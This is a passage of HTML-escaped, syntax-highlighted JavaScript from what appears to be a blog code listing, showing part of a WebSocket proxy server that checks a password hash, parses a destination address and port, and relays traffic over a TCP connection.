&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;const &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt; of possiblePasswords&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; crypto.createHash&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sha224&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.update&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.digest&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; receivedPasswordHash&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;matchedPassword&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; pwd&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        break&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!matchedPassword&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 56&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x0d &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset + 1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x0a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;cmd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cmd !&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; 0x01&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;atyp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; host, port&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;atyp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x01&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset, offset + 4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 4&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;atyp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x03&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      const &lt;span class=&#34;nv&#34;&gt;hostLen&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 1&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset, offset + hostLen&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.toString&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; hostLen&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;atyp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x04&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;host&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset, offset + 16&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.reduce&lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;s, b, i, a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i % &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ? s.concat&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;a.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;i - 1, i + 1&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; : s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;[])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        .map&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; b.readUInt16BE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.toString&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;16&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 16&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;port&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; msg.readUInt16BE&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset &amp;lt; msg.length &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x0d &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; msg&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;offset + 1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; 0x0a&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nv&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; 2&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;duplex&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; createWebSocketStream&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    resolveHost&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;host&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      .then&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;resolvedIP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        net.connect&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; host: resolvedIP, port &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset &amp;lt; msg.length&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            this.write&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          duplex.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;this&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;duplex&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      .catch&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;error&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        net.connect&lt;span class=&#34;o&#34;&gt;({&lt;/span&gt; host, port &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;, &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset &amp;lt; msg.length&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            this.write&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;msg.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;offset&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          duplex.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;this&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;.pipe&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;duplex&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;o&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; true&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; catch &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;error&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; false&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// Ws è¿æ¥å¤„ç†
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wss.on&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;connection&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ws, req&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; req.url &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ws.once&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;message&amp;#39;&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
